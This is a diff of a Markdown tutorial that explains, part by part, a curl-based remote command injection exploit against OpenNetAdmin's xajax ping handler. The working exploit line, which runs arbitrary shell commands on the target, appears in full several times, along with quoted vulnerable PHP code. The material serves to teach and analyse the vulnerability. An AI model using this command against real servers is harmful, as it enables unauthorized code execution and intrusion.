@@ -33,12 +33,13 @@ while true ; do
     curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
 done
 ```
-
+---
 ## Exploit Command Breakdown
+
 ```bash
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
 ```
----
+
 ### curl flags
 ```bash
 curl --silent -d
@@ -46,7 +47,6 @@ curl --silent -d
 
 ```curl```'s flags disable the progress bar and make a POST request containing the included data.
 
----
 ### xajax=window_submit
 ```bash
 "xajax=window_submit"
@@ -64,7 +64,7 @@ function window_submit($window_name, $form='', $function='') {
     
     printmsg("DEBUG => webwin_submit() Window: {$window_name} Function: {$function} Form: {$form}", 1);
 ```
----
+
 ### xajaxr=1574117726710
 ```bash
 "&xajaxr=1574117726710"
@@ -77,7 +77,6 @@ Mon 18 Nov 2019 05:55:26 PM EST
 ```
 2019-11-18 is a day before the official vulnerability disclosure date in the header (2019-11-19), so we were right!
 
----
 ### xajaxargs[]
 ```bash
 "&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping"
@@ -158,14 +157,14 @@ function ws_ping($window_name, $form='') {
     return(window_open("{$window_name}_results", $window));
 }
 ```
----
+
 ### ${URL}
 ```bash
 curl --silent -d "[...]" "${URL}"
 ```
 The URL variable tells  ```curl``` where to send the data. With this exploit, we have to specify the location of the OpenNetAdmin directory, e.g. ```http[s]://<ip>:<port>/ona/```.
 
----
+
 ### sed, tail, and head
 ```bash
     curl --silent -d "[...]" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
